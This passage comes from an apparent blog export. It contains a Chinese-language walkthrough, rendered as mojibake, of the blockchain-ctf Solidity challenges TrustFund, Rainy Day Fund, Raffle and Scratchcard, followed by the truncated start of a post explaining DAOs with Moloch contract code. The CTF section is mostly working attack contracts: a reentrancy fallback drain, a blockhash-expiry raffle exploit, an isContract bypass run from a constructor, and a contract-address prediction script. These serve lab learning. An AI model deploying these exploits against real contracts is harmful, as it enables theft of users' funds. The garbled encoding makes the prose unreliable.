&#125;\n\n    function checkIfYearHasPassed() internal&#123;\n        if (now>=startDate + numberOfWithdrawls * 365 days)&#123;\n            withdrewThisYear = false;\n        &#125; \n    &#125;\n\n    function withdraw() external ctf&#123;\n        require(allowancePerYear > 0, \"No Allowances Allowed\");\n        checkIfYearHasPassed();\n        require(!withdrewThisYear, \"Already Withdrew This Year\");\n        if (msg.sender.call.value(allowancePerYear)())&#123;\n            withdrewThisYear = true;\n            numberOfWithdrawls = numberOfWithdrawls.add(1);\n        &#125;\n    &#125;\n    \n    function returnFunds() external payable ctf&#123;\n        require(msg.value == allowancePerYear, \"Incorrect Transaction Value\");\n        require(withdrewThisYear==true, \"Cannot Return Funds Before Withdraw\");\n        withdrewThisYear = false;\n        numberOfWithdrawls=numberOfWithdrawls.sub(1);\n    &#125;\n&#125;\n\nAnalyzeæŒºæ˜Žæ˜¾çš„é‡å…¥æ¼æ´žï¼Œifåˆ¤æ–­å“ªé‡Œè¿›è¡Œäº†callè½¬è´¦ï¼Œä¸»è¦å°±æ˜¯æ”»å‡»åˆçº¦çš„fallbackå‡½æ•°æž„é€ ï¼Œæ€»å…±æ‰§è¡Œ10æ¬¡withdraw()å‡½æ•°å³å¯\nAttackpragma solidity ^0.6.0;\ninterface TrustFund&#123;\n    function withdraw() external;\n    function ctf_challenge_add_authorized_sender(address _addr) external;\n    function returnFunds() external;\n&#125;\ncontract attack&#123;\n    TrustFund target=TrustFund(0xdCe036d62FCAE1593195aba30B9629E49749f3c0);\n    uint public i=1;\n    function add(address addr)public &#123;\n        target.ctf_challenge_add_authorized_sender(addr);\n    &#125;\n    function pwn() public payable &#123;\n        target.withdraw();\n    &#125;\n    fallback() external payable&#123;\n        if(i&lt;=9)&#123;\n        target.withdraw();\n        i++;\n        &#125;\n    &#125;\n    function kill(address payable acct)public payable&#123;\n        selfdestruct(acct);\n    &#125;\n&#125;\n\n\n11.Rainy Day FundCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\ncontract DebugAuthorizer&#123;\n    \n    bool public debugMode;\n\n    constructor() public payable&#123;\n        if(address(this).balance == 1.337 ether)&#123;\n            debugMode=true;\n        &#125;\n    &#125;\n&#125;\n\ncontract RainyDayFund is CtfFramework&#123;\n\n    address public developer;\n    mapping(address=>bool) public fundManagerEnabled;\n    DebugAuthorizer public debugAuthorizer;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        //debugAuthorizer = (new DebugAuthorizer).value(1.337 ether)(); // Debug mode only used during development\n        debugAuthorizer = new DebugAuthorizer();\n        developer = msg.sender;\n        fundManagerEnabled[msg.sender] = true;\n    &#125;\n    \n    modifier isManager() &#123;\n        require(fundManagerEnabled[msg.sender] || debugAuthorizer.debugMode() || msg.sender == developer, \"Unauthorized: Not a Fund Manager\");\n         _;\n    &#125;\n\n    function () external payable ctf&#123;\n        // Anyone can add to the fund    \n    &#125;\n    \n    function addFundManager(address _newManager) external isManager ctf&#123;\n        fundManagerEnabled[_newManager] = true;\n    &#125;\n\n    function removeFundManager(address _previousManager) external isManager ctf&#123;\n        fundManagerEnabled[_previousManager] = false;\n    &#125;\n\n    function withdraw() external isManager ctf&#123;\n        msg.sender.transfer(address(this).balance);\n    &#125;\n&#125;\n\nAnalyzeä¸»è¦è€ƒæŸ¥äº†createç®—æ³•ï¼Œæå‰é¢„è®¡æ‰€åˆ›å»ºåˆçº¦çš„åœ°å€ï¼Œè¯¦è§æˆ‘çš„ä¸€ç¯‡åšå®¢ï¼Œè®²çš„æŒºè¯¦ç»†ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†æ ¹æ®ä¸¤é“é¢˜ç›®ç†è§£createåŠcreate2ç®—æ³•\nAttack\nå¾—åˆ°åœ°å€åŽæè½¬å…¥1.337ethå³å¯\n12.RaffleCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\ncontract Raffle is CtfFramework&#123;\n\n    uint256 constant fee = 0.1 ether;\n\n    address private admin;\n\n    bytes4 private winningTicket;\n    uint256 private blocknum;\n\n    uint256 public ticketsBought;\n    bool public raffleStopped;\n\n    mapping(address=>uint256) private rewards;\n    mapping(address=>bool) private potentialWinner;\n    mapping(address=>bytes4) private ticketNumbers;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n        rewards[address(this)] = msg.value;\n        admin = msg.sender;\n    &#125;\n\n    function buyTicket() external payable ctf&#123;\n        if(msg.value >= fee)&#123;\n            winningTicket = bytes4(0);\n            blocknum = block.number+1;\n            ticketsBought += 1;\n            raffleStopped = false;\n            rewards[msg.sender] += msg.value;\n            ticketNumbers[msg.sender] = bytes4((msg.value - fee)/10**8);\n            potentialWinner[msg.sender] = true;\n        &#125;\n    &#125;\n\n    function closeRaffle() external ctf&#123;\n        require(ticketsBought>0);\n        require(!raffleStopped);\n        require(blocknum != 0);\n        require(winningTicket == bytes4(0));\n        require(block.number>blocknum);\n        require(msg.sender==admin || rewards[msg.sender]>0);\n        winningTicket = bytes4(blockhash(blocknum));\n        potentialWinner[msg.sender] = false;\n        raffleStopped = true;\n    &#125;\n\n    function collectReward() external payable ctf&#123;\n        require(raffleStopped);\n        require(potentialWinner[msg.sender]);\n        rewards[address(this)] += msg.value;\n        if(winningTicket == ticketNumbers[msg.sender])&#123;\n            msg.sender.transfer(rewards[msg.sender]);\n            msg.sender.transfer(rewards[address(this)]); \n            rewards[msg.sender] = 0;\n            rewards[address(this)] = 0;\n        &#125;\n    &#125;\n\n    function skimALittleOffTheTop(uint256 _value) external ctf&#123;\n        require(msg.sender==admin);\n        require(rewards[address(this)]>_value);\n        rewards[address(this)] = rewards[address(this)] - _value;\n        msg.sender.transfer(_value);\n    &#125;\n\n    function () public payable ctf&#123;\n        if(msg.value>=fee)&#123;\n            this.buyTicket();\n        &#125;\n        else if(msg.value == 0)&#123;\n            this.closeRaffle();\n        &#125;\n        else&#123;\n            this.collectReward();\n        &#125;\n    &#125;\n\n&#125;\n\nAnalyzeä¹Ÿæ˜¯å…³äºŽéšæœºæ•°çš„é—®é¢˜ï¼Œblockhashåªèƒ½è¯»å–åˆ°æœ€è¿‘çš„256ä¸ªåŒºå—ï¼Œè¶…è¿‡äº†å°±ä¼šè¿”å›žå€¼0ï¼Œæ‰€ä»¥ticketNumbers[msg.sender]å¯ä»¥é€šè¿‡msg.valueæ¥æŽ§åˆ¶å…¶å€¼ä¸º0ï¼Œéœ€è¦ä¸¤ä¸ªåˆçº¦ä¸€ä¸ªç”¨æ¥æ”¹å˜raffleStoppedï¼Œä¸€ä¸ªç”¨æ¥æ”¹å˜potentialWinner[msg.sender]ï¼Œç„¶åŽç­‰å¾…256ä¸ªåŒºå—è¿‡åŽè°ƒç”¨collectReward()å³å¯é€šå…³\nAttackcontract attack1&#123;\n     Raffle target=Raffle(0xf49481a5110f9910cfca57f855bc6eefd8465c5c);\n     constructor()public payable&#123;\n        require(msg.value==0.1 ether);\n    &#125;\n    function buy()public payable&#123;\n        target.buyTicket.value(0.1 ether)();\n    &#125;\n    function pwn()public&#123;\n        target.collectReward();\n    &#125;\n    function() external payable&#123;&#125;\n    function kill()public payable&#123;\n        selfdestruct(tx.origin);\n    &#125;\n&#125;\ncontract attack2&#123;\n    Raffle target=Raffle(0xf49481a5110f9910cfca57f855bc6eefd8465c5c);\n    constructor()public payable&#123;\n        require(msg.value==0.1 ether);\n    &#125;\n    function makeraffleStoppedtruefirststep()public payable&#123;\n        target.buyTicket.value(0.1 ether)();\n    &#125;\n    function makeraffleStoppedtrue()public&#123;\n        target.closeRaffle();\n    &#125; \n&#125;\n\nå…ˆæ‰§è¡Œattack1ä½¿potentialWinner[msg.sender]ä¸ºtrueï¼Œåœ¨æ‰§è¡Œattack2ä½¿ blocknumä¸ºå½“å‰åŒºå—ç­‰å¾…256åŒºå—ä¹‹åŽè°ƒç”¨makeraffleStoppedtrue()ä½¿raffleStoppedä¸ºtrueï¼Œå†è°ƒç”¨pwnå³å¯èŽ·å¾—ç›®æ ‡åˆçº¦ä¸­çš„å…¨éƒ¨ä½™é¢ã€‚\n13.ScratchcardCodepragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\nlibrary Address &#123;\n    function isContract(address account) internal view returns (bool) &#123;\n        uint256 size;\n        assembly &#123; size := extcodesize(account) &#125;\n        return size > 0;\n    &#125;\n&#125;\n\ncontract Scratchcard is CtfFramework&#123;\n\n    event CardPurchased(address indexed player, uint256 cost, bool winner);\n\n    mapping(address=>uint256) private winCount;\n    uint256 private cost;\n\n\n    using Address for address;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    &#123;\n    &#125;\n\n    modifier notContract()&#123;\n        require(!msg.sender.isContract(), \"Contracts Not Allowed\");\n        _;\n    &#125;\n    \n    function play() public payable notContract ctf&#123;\n        bool won = false;\n        if((now%10**8)*10**10 == msg.value)&#123;\n            won = true;\n            winCount[msg.sender] += 1;\n            cost = msg.value;\n            msg.sender.transfer(cost);\n        &#125;\n        else&#123;\n            cost = 0;\n            winCount[msg.sender] = 0;\n        &#125;\n        emit CardPurchased(msg.sender, msg.value, won);\n    &#125;    \n\n    function checkIfMegaJackpotWinner() public view returns(bool)&#123;\n        return(winCount[msg.sender]>=25);\n    &#125;\n\n    function collectMegaJackpot(uint256 _amount) public notContract ctf&#123;\n        require(checkIfMegaJackpotWinner(), \"User Not Winner\");\n        require(2 * cost - _amount > 0, \"Winners May Only Withdraw Up To 2x Their Scratchcard Cost\");\n        winCount[msg.sender] = 0;\n        msg.sender.transfer(_amount);\n    &#125;\n\n    function () public payable ctf&#123;\n        play();\n    &#125;\n\n&#125;\n\nAnalyzeä¸»è¦è€ƒæŸ¥äº†isContractç»•è¿‡ï¼Œåœ°å€ç±»åž‹åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯è´¦æˆ·åœ°å€codesizeä¸º0ï¼Œå¦ä¸€ç§æ˜¯åˆçº¦åœ°å€codesizeå¤§äºŽ0ã€‚\nç”±äºŽisContracté™åˆ¶ï¼Œè¿™é“é¢˜çœ‹èµ·æ¥æ˜¯åªèƒ½ç”±humanè¿›è¡Œæ”»å‡»ï¼Œç„¶è€Œä¸æ˜¯ï¼Œåˆçº¦åœ¨æž„é€ æ—¶codesizeä¸º0ï¼Œæ‰€ä»¥åœ¨æ”»å‡»åˆçº¦çš„constructorä¸­å¯ä»¥å¯¹é¢˜ç›®åˆçº¦è¿›è¡Œè°ƒç”¨\né¢˜ç›®è¿˜æ¶‰åŠåˆ°ä¸€ç‚¹å°±æ˜¯createç®—æ³•ï¼Œè¯¦è§æˆ‘çš„å¦ä¸€ç¯‡åšå®¢æ ¹æ®ä¸¤é“é¢˜ç›®ç†è§£createåŠcreate2ç®—æ³•\næå‰å°†æœªéƒ¨ç½²çš„åˆçº¦åœ°å€æ·»åŠ åˆ°CtfFrameworkä¸­ï¼Œåœ¨è®¾ç½®é‡‘é¢ç›´æŽ¥éƒ¨ç½²å³å¯æ™šåœºæ”»å‡»\nAttackåˆçº¦åœ°å€è®¡ç®—\ndef getnonce(addr):\n    return w3.eth.getTransactionCount(Web3.toChecksumAddress(hex(addr)))\ndef getaddress(sender,nonce):\n    return (Web3.sha3(rlp.encode([sender, nonce]))[12:].hex())\n\naddr=0x2b2E23ceC9921288f63F60A839E2B28235bc22ad\nnonce=getnonce(addr)\nprint(nonce)\ngetcontractaddress=getaddress(addr,nonce)\nprint(getcontractaddress)\n\nå€¼å¾—æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œåœ¨ ctf_challenge_add_authorized_senderåŽè®¡ç®—ï¼Œå¦åˆ™è°ƒç”¨åŽnonceä¼šå˜åŒ–\ncontract attack&#123;\n    Scratchcard target=Scratchcard(0xc239f15e5f37e29b26d92786b005c124ae629c1f);\n    uint public a;\n    uint public i=1;\n    constructor()public payable&#123;\n        require(msg.value==3 ether);\n        a=(now%10**8)*10**10;\n        for(i;i&lt;=25;i++)\n        target.play.value(a*1 wei)();\n        target.collectMegaJackpot(3.5 ether);\n    &#125;\n    function() public payable&#123;\n    &#125;\n     function get() public view returns(uint)&#123;\n        return address(this).balance;\n    &#125;\n    function kill()public payable&#123;\n        selfdestruct(tx.origin);\n    &#125;\n&#125;\n\n\nSummaryè‡³æ­¤blockchain-ctfé¶åœºæ‰€æœ‰é¢˜ç›®å‡å·²è§£å‡ºï¼Œæ€»ä½“æ¥è¯´éš¾åº¦å¾ªåºæ¸è¿›ï¼Œè¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šæ–°ä¸œè¥¿çš„ï¼Œæ¯”å¦‚è¯´createç®—æ³•ä¹‹ç±»çš„ï¼ŒåŒæ—¶ä¹Ÿå·©å›ºäº†å¾ˆå¤šä¹‹å‰å­¦è¿‡çš„ä¸œè¥¿ï¼Œåƒé‡å…¥æ¼æ´žç­‰ç­‰ç­‰ç­‰ï¼Œéƒ½å†æ¬¡åŠ æ·±äº†å°è±¡ï¼\n","slug":"blockchain-ctf","date":"2022-08-01T10:35:33.060Z","categories_index":"","tags_index":"åŒºå—é“¾","author_index":"bcYng"},{"id":"9577d25fd5332f28e4fb9b967ac228a0","title":"Understanding DAO with an example","content":"\n\n\nIntroWhat is DAOï¼ŸDAOçš„è‹±æ–‡å…¨ç§°ä¸ºDecentralized A utonomous O rganizationï¼Œå¸¸è§çš„ä¸­æ–‡ç¿»è¯‘ä¸ºåŽ»ä¸­å¿ƒåŒ–è‡ªæ²»ç»„ç»‡ï¼ˆç¤¾åŒºï¼‰ï¼Œæ˜¯ä¸€ç§ä»¥å…¬å¼€é€æ˜Žçš„è®¡ç®—æœºä»£ç æ¥ä½“çŽ°çš„ç»„ç»‡ï¼Œå…¶å—æŽ§äºŽè‚¡ä¸œï¼Œå¹¶ä¸å—ä¸­å¤®æ”¿åºœå½±å“ã€‚ä¸€ä¸ªåˆ†å¸ƒå¼è‡ªæ²»ç»„ç»‡çš„é‡‘èžäº¤æ˜“è®°å½•å’Œç¨‹åºè§„åˆ™æ˜¯ä¿å­˜åœ¨åŒºå—é“¾ä¸­çš„ã€‚ç›®å‰åˆ†å¸ƒå¼è‡ªæ²»ç»„ç»‡ç¡®åˆ‡çš„æ³•å¾‹åœ°ä½è¿˜ä¸æ¸…æ¥šã€‚\nWhy DAOï¼ŸDAOçš„ä¼˜ç‚¹1ã€æ¶ˆé™¤è¥ç§èˆžå¼Šï¼šDAOçš„èµ„é‡‘éƒ½æ˜¯æŒ‰ç…§å…¬å¼€é€æ˜Žçš„æ–¹å¼èŽ·å¾—ä»¥åŠä½¿ç”¨çš„ï¼Œæ¯ä¸€ç¬”èµ„é‡‘çš„æ¥æºä¸ŽåŽ»å‘éƒ½ååˆ†æ¸…æ™°ï¼Œä¸å­˜åœ¨åœ°ä¸‹äº¤æ˜“ã€‚ 2ã€é™ä½Žæ²Ÿé€šæˆæœ¬ï¼šæ‰§è¡ŒæŸä¸€ä¸ªå†³ç­–æ²¡æœ‰å•†é‡çš„ä½™åœ°ï¼Œåªéœ€è¦æ ¹æ®åˆçº¦å’ŒæŠ•ç¥¨å¾—å‡ºçš„ææ¡ˆè¿è¡Œå³å¯ã€‚ 3ã€é™ä½Žç®¡ç†æˆæœ¬ï¼šDAOæ²¡æœ‰å±‚çº§ç»“æž„ï¼Œæ²¡æœ‰CEOï¼Œæ²¡æœ‰ç»ç†ï¼Œä¸éœ€è¦ä»˜å‡ºç®¡ç†æˆæœ¬ã€‚ 4ã€å¹³ç­‰ï¼šDAOæ²¡æœ‰å±‚çº§ç»“æž„ï¼Œæ‰€æœ‰äººéƒ½æ˜¯å¹³ç­‰çš„ã€‚ 5ã€æ²¡æœ‰ç‹¬è£ï¼šæ‰€æœ‰äººéƒ½å¯ä»¥ä¸ºç»„ç»‡æå‡ºæ–¹æ¡ˆå¹¶å¯èƒ½è¢«ä½¿ç”¨ã€‚ 6ã€å›¢ç»“ï¼šæ‰€æœ‰çš„å‚ä¸Žè€…éƒ½æŒæœ‰DAOçš„é€šè¯ï¼ŒDAOè¿è¡Œå¾—è¶Šå¥½ï¼Œé€šè¯å°±ä¼šè¶Šæœ‰ä»·å€¼ã€‚æ‰€æœ‰å‚ä¸Žè€…ä¼šæœ‰ç›¸åŒçš„ç›®æ ‡ï¼Œå³è®©DAOæ›´å¥½åœ°è¿è¡Œã€‚åŒæ—¶ï¼Œæå‡ºææ¡ˆä»¥åŠæŠ•ç¥¨éƒ½éœ€è¦æ¶ˆè€—ä¸€å®šé‡çš„é€šè¯ã€‚å› æ­¤ï¼ŒæŠ•ç¥¨äººéƒ½ä¼šä»ŽDAOçš„è§’åº¦å‡ºå‘ï¼ŒçœŸå¿ƒçœŸæ„ä¸ºDAOè°‹ç¦åˆ©ã€‚\nDAOç»„ç»‡çš„æ€§è´¨ç‰¹ç‚¹1ã€åˆ†å¸ƒå¼ä¸ŽåŽ»ä¸­å¿ƒåŒ–ï¼šDAO ä¸­ä¸å­˜åœ¨ä¸­å¿ƒèŠ‚ç‚¹ä»¥åŠå±‚çº§åŒ–çš„ç®¡ç†æž¶æž„ï¼Œå®ƒé€šè¿‡è‡ªä¸‹è€Œä¸Šçš„ç½‘ç»œèŠ‚ç‚¹ä¹‹é—´çš„äº¤äº’ã€ç«žäº‰ä¸Žåä½œæ¥å®žçŽ°ç»„ç»‡ç›®æ ‡ã€‚å› æ­¤ï¼ŒDAOä¸­èŠ‚ç‚¹ä¸ŽèŠ‚ç‚¹ä¹‹é—´ã€èŠ‚ç‚¹ä¸Žç»„ç»‡ä¹‹é—´çš„ä¸šåŠ¡å¾€æ¥ä¸å†ç”±è¡Œæ”¿éš¶å±žå…³ç³»æ‰€å†³å®šï¼Œè€Œæ˜¯éµå¾ªå¹³ç­‰ã€è‡ªæ„¿ã€äº’æƒ ã€äº’åˆ©çš„åŽŸåˆ™ï¼Œç”±å½¼æ­¤çš„èµ„æºç¦€èµ‹ã€äº’è¡¥ä¼˜åŠ¿å’Œåˆ©ç›Šå…±èµ¢æ‰€é©±åŠ¨ã€‚æ¯ä¸ªç»„ç»‡èŠ‚ç‚¹éƒ½å°†æ ¹æ®è‡ªå·±çš„èµ„æºä¼˜åŠ¿å’Œæ‰èƒ½èµ„è´¨ï¼Œåœ¨é€šè¯çš„æ¿€åŠ±æœºåˆ¶çš„ä½œç”¨ä¸‹æœ‰æ•ˆåä½œï¼Œä»Žè€Œäº§ç”Ÿå¼ºå¤§çš„ååŒæ•ˆåº”ã€‚ 2ã€è‡ªä¸»æ€§ä¸Žè‡ªåŠ¨åŒ–ï¼šåœ¨ä¸€ä¸ªç†æƒ³çŠ¶æ€çš„ DAOä¸­ï¼Œç®¡ç†æ˜¯ä»£ç åŒ–ã€ç¨‹åºåŒ–ä¸”è‡ªåŠ¨åŒ–çš„ã€‚â€œä»£ç å³æ³•å¾‹â€ï¼Œç»„ç»‡ä¸å†æ˜¯é‡‘å­—å¡”å¼è€Œæ˜¯åˆ†å¸ƒå¼ï¼ŒæƒåŠ›ä¸å†æ˜¯ä¸­å¿ƒåŒ–è€Œæ˜¯åŽ»ä¸­å¿ƒåŒ–ï¼Œç®¡ç†ä¸å†æ˜¯ç§‘å±‚åˆ¶è€Œæ˜¯ç¤¾åŒºè‡ªæ²»ï¼Œç»„ç»‡è¿è¡Œä¸å†éœ€è¦å…¬å¸è€Œæ˜¯ç”±é«˜åº¦è‡ªæ²»çš„ç¤¾åŒºæ‰€æ›¿ä»£ã€‚æ­¤å¤–ï¼Œç”±äºŽ DAOè¿è¡Œåœ¨ç”±åˆ©ç›Šç›¸å…³è€…å…±åŒç¡®å®šçš„è¿è¡Œæ ‡å‡†å’Œåä½œæ¨¡å¼ä¸‹ï¼Œç»„ç»‡å†…éƒ¨çš„å…±è¯†å’Œä¿¡ä»»æ›´æ˜“è¾¾æˆï¼Œ å¯ä»¥æœ€å¤§é™åº¦åœ°é™ä½Žç»„ç»‡çš„ä¿¡ä»»æˆæœ¬ã€æ²Ÿé€šæˆæœ¬å’Œäº¤æ˜“æˆæœ¬ã€‚ 3ã€ç»„ç»‡åŒ–ä¸Žæœ‰åºæ€§ï¼šä¾èµ–äºŽæ™ºèƒ½åˆçº¦ï¼ŒDAOä¸­çš„è¿è½¬è§„åˆ™ã€å‚ä¸Žè€…çš„èŒè´£æƒåˆ©ä»¥åŠå¥–æƒ©æœºåˆ¶ç­‰å‡å…¬å¼€é€æ˜Žã€‚æ­¤å¤–ï¼Œé€šè¿‡ä¸€ç³»åˆ—é«˜æ•ˆçš„è‡ªæ²»åŽŸåˆ™ï¼Œç›¸å…³å‚ä¸Žè€…çš„æƒç›Šå¾—åˆ°ç²¾å‡†åˆ†åŒ–ä¸Žé™ç»´ï¼Œå³ç»™é‚£äº›ä»˜å‡ºåŠ³åŠ¨ã€åšå‡ºè´¡çŒ®ã€æ‰¿æ‹…è´£ä»»çš„ä¸ªä½“åŒ¹é…ç›¸åº”çš„æƒåˆ©å’Œæ”¶ç›Šï¼Œä»¥ä¿ƒè¿›äº§ä¸šåˆ†å·¥ä»¥åŠæƒåˆ©ã€è´£ä»»ã€åˆ©ç›Šå‡ç­‰ï¼Œä½¿å¾—ç»„ç»‡è¿è½¬æ›´åŠ åè°ƒã€æœ‰åºã€‚ 4ã€æ™ºèƒ½åŒ–ä¸Žé€šè¯åŒ– ï¼šDAOåº•å±‚ä»¥å°è£…äº†æ”¯æŒDAOï¼ˆåŠå…¶è¡ç”Ÿåº”ç”¨çš„æ‰€æœ‰åŸºç¡€è®¾æ–½â€”â€”äº’è”ç½‘åŸºç¡€åè®®ã€åŒºå—é“¾æŠ€æœ¯ã€äººå·¥æ™ºèƒ½ã€å¤§æ•°æ®ã€ç‰©è”ç½‘ç­‰ä¸ºæŠ€æœ¯æ”¯æ’‘ï¼Œä»¥æ•°å­—åŒ–ã€æ™ºèƒ½åŒ–ã€é“¾ä¸Šé“¾ä¸‹ååŒæ²»ç†ä¸ºæ²»ç†æ‰‹æ®µï¼Œæ”¹å˜äº†ä¼ ç»Ÿçš„ç§‘å±‚åˆ¶ä»¥åŠäººä¸ºå¼ç®¡ç†æ–¹å¼ï¼Œå®žçŽ°äº†ç»„ç»‡çš„æ™ºèƒ½åŒ–ç®¡ç†ã€‚é€šè¯ï¼ˆtokenï¼‰ä½œä¸ºDAOï¼ˆå²›ï¼‰æ²»ç†è¿‡ç¨‹ä¸­çš„é‡è¦æ¿€åŠ±æ‰‹æ®µï¼Œå°†ç»„ç»‡ä¸­çš„å„ä¸ªå…ƒç´ ï¼ˆä¾‹å¦‚äººã€ç»„ç»‡ã€çŸ¥è¯†ã€äº‹ä»¶ã€äº§å“ç­‰ï¼‰æ•°å­—åŒ–ã€é€šè¯åŒ–ï¼Œä»Žè€Œä½¿å¾—è´§å¸èµ„æœ¬ã€äººåŠ›èµ„æœ¬ä»¥åŠå…¶ä»–è¦ç´ èµ„æœ¬å……åˆ†èžåˆï¼Œæ›´å¥½åœ°æ¿€å‘ç»„ç»‡çš„æ•ˆèƒ½å’Œå®žçŽ°ä»·å€¼æµè½¬ã€‚\nDAOçš„ä¼˜åŠ¿1ã€å¿«é€Ÿã€æ— è¾¹ç•Œçš„ä¸šåŠ¡å†³ç­–ï¼šå¦‚æžœåœ¨Aå›½çš„æŸäººæƒ³è·ŸBå›½ã€Cå›½ç­‰å›½å®¶çš„åˆ›å§‹äººä¸€èµ·åˆ›ä¸šï¼Œå½“å‰åšä¸ªäº‹æƒ…çš„è¿‡ç¨‹éžå¸¸å¤æ‚ã€‚ä¸åŒçš„å¸æ³•ç®¡è¾–åŒºæœ‰ä¸åŒçš„è¦æ±‚ã€‚å†³ç­–æ‰€éœ€çš„æ—¶é—´èŒƒå›´ä¹Ÿæœ‰æ‰€ä¸åŒã€‚ä¾‹å¦‚ï¼Œå‡è®¾Aå›½çš„æŸäººåªéœ€ä¸€å¤©å³å¯æ­£å¼æˆç«‹ä¸šåŠ¡ï¼Œè€Œåœ¨Bå›½çš„é‚£ä½éœ€è¦3ä¸ªæœˆæ—¶é—´æ¥å¯åŠ¨ã€‚æ˜¾ç„¶ï¼Œåœ¨Bå›½çš„äººå¹¶ä¸æ‹¥æœ‰è·ŸAå›½çš„é‚£ä½ä¸€æ ·çš„èµ„æºã€‚ DAOåˆ™æä¾›äº†ä¸€ç§è§£å†³æ–¹æ¡ˆï¼Œå¯ä»¥é€šè¿‡éµå®ˆä¸€å¥—æ ‡å‡†è§„åˆ™ï¼Œè®©æ¯ä¸ªäººéƒ½å¯ä»¥åœ¨åŒç­‰æ¡ä»¶ä¸‹å·¥ä½œï¼Œè€Œä¸ç”¨è€ƒè™‘æ‰€åœ¨çš„åœ°ç†ä½ç½®ã€‚æœ¬è´¨ä¸Šè¯´ï¼Œåˆ›å»ºDAOçš„ä¸€ä¸ªä¸»è¦åŽŸå› ä¹‹ä¸€æ˜¯ä¸ºç»„ç»‡çš„æˆç«‹å’Œè¿è¥æä¾›å¹³ç­‰çš„ä½“ç³»ã€‚ 2ã€ç»„ç»‡èŒƒå›´å†…çš„æŠ•ç¥¨ï¼šå¾ˆå¤šå…¬å¸éƒ½æœ‰è‘£äº‹ä¼šæ¥åšé‡è¦å†³ç­–ã€‚è¿™ä¹ˆåšçš„é—®é¢˜æ˜¯è¿™äº›ç»„ç»‡é€šå¸¸åªå¯¹å°‘æ•°é€‰å‡ºçš„é—®é¢˜è¿›è¡ŒæŠ•ç¥¨ï¼Œä¸”å¹¶ä¸ä¸€å®šä»£è¡¨ç»„ç»‡çš„å¤§å¤šæ•°ã€‚DAOå¯ä»¥æ”¹å˜è¿™ä¸€ç‚¹ï¼Œå®ƒå…è®¸ç»„ç»‡çš„ä»»ä½•äººéƒ½å¯ä»¥å°±ä»–ä»¬å…³å¿ƒçš„é—®é¢˜è¿›è¡ŒæŠ•ç¥¨ã€‚ä¾‹å¦‚ï¼ŒAå¯èƒ½ä¼šå…³å¿ƒé—®é¢˜Aå’Œé—®é¢˜Cï¼Œä½†ä¸æ€Žä¹ˆå…³å¿ƒé—®é¢˜Bã€‚ é€šè¿‡DAOï¼ŒAå¯ä»¥æ ¹æ®è‡ªå·±å…³å¿ƒçš„ç¨‹åº¦æ¥å¯¹ææ¡ˆè¿›è¡Œç›¸åº”æ¯”ä¾‹çš„ä»£å¸æŠ•ç¥¨ã€‚DAOï¼ˆå²›ï¼‰ä¸ä¼šä½¿ç”¨å¯¹ç»„ç»‡å†…æˆå‘˜çš„è¾“å…¥å¿½ç•¥æˆ–ä¸åŠ è®¡å…¥çš„ç³»ç»Ÿï¼Œè€Œæ˜¯ç¡®ä¿æ‰€æœ‰æŠ•ç¥¨éƒ½è¢«ç»Ÿè®¡å¹¶å‘æ‰€æœ‰äººæ˜¾ç¤ºã€‚ 3ã€æ— æ³•ç¯¡æ”¹è§„åˆ™ï¼šåœ¨ä»»ä½•ç»„ç»‡å†…ï¼Œæ”¿ç­–å’Œè§„åˆ™å†³å®šä»€ä¹ˆèƒ½åšä»¥åŠä»€ä¹ˆä¸èƒ½åšã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸€å®¶å…¬å¸ï¼Œä¸éµå®ˆè§„å®šçš„å‘˜å·¥å¯èƒ½ä¼šé­å—æƒ©ç½šã€‚å¦‚æžœæŸäººä¸Šç­è¿Ÿåˆ°ï¼Œè¿™å¯èƒ½ä¼šä¹Ÿå¯èƒ½ä¸ä¼šå¯¼è‡´ç›¸åº”åœ°æ‰£å‡å·¥èµ„ã€‚è¿™ä¸ªå†³å®šå¯ä»¥é€šè¿‡æ—¶é—´æˆ³æ¥è‡ªåŠ¨æ‰§è¡Œï¼Œä½†å¹¶éžæ‰€æœ‰ç»„ç»‡éƒ½ä¼šå¼ºåˆ¶æ‰§è¡Œã€‚ ä¼šè®®æ˜¯å½¢æˆæƒ³æ³•å’Œè®¨è®ºæƒ³æ³•çš„æœºä¼šã€‚DAOå¯ä»¥è®©è¿œç¨‹ç»„ç»‡æ›´å®¹æ˜“è¯„ä¼°æˆå‘˜å…´è¶£ï¼Œæ›´å®¹æ˜“è®©æƒ³æ³•ä»Žæž„æƒ³å˜ä¸ºçŽ°å®žã€‚\nps:Why is DAO å¤„å†…å®¹æ¥è‡ª:ä¸ºä»€ä¹ˆDAOä¼šæˆä¸ºèµ„æœ¬å¸‚åœºçš„æ–°æˆ˜åœºï¼ŸDAOçš„æœªæ¥æ€Žä¹ˆæ ·ï¼Ÿ\nExampleCode/**\n *Submitted for verification at Etherscan.io on 2019-02-18\n*/\n\npragma solidity ^0.5.3;\n\ncontract Moloch &#123;\n    using SafeMath for uint256;\n\n    /***************\n    GLOBAL CONSTANTS\n    ***************/\n    uint256 public periodDuration; // default = 17280 = 4.8 hours in seconds (5 periods per day)\n    uint256 public votingPeriodLength; // default = 35 periods (7 days)\n    uint256 public gracePeriodLength; // default = 35 periods (7 days)\n    uint256 public abortWindow; // default = 5 periods (1 day)\n    uint256 public proposalDeposit; // default = 10 ETH (~$1,000 worth of ETH at contract deployment)\n    uint256 public dilutionBound; // default = 3 - maximum multiplier a YES voter will be obligated to pay in case of mass ragequit\n    uint256 public processingReward; // default = 0.1 - amount of ETH to give to whoever processes a proposal\n    uint256 public summoningTime; // needed to determine the current period\n\n    IERC20 public approvedToken; // approved token contract reference; default = wETH\n    GuildBank public guildBank; // guild bank contract reference\n\n    // HARD-CODED LIMITS\n    // These numbers are quite arbitrary; they are small enough to avoid overflows when doing calculations\n    // with periods or shares, yet big enough to not limit reasonable use cases.\n    uint256 constant MAX_VOTING_PERIOD_LENGTH = 10**18; // maximum length of voting period\n    uint256 constant 